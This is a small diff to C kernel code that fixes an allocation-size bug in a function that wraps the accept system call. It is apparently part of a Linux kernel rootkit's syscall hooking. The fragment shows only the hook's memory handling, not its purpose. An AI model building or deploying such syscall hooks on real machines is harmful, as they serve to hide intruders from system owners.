@@ -22,7 +22,7 @@ asmlinkage int muaddib_accept(const struct pt_regs *regs){
     struct sockaddr_in __user* sock_in = (struct sockaddr_in *)regs->si;
     struct sockaddr_in *sock_in_kernel = NULL;
     int ret = og_accept(regs);
-    sock_in_kernel = kzalloc(ret, GFP_KERNEL);
+    sock_in_kernel = kzalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
     long error = copy_from_user(sock_in_kernel, sock_in, sizeof(struct sockaddr_in));
     if(error){
         kfree(sock_in_kernel);
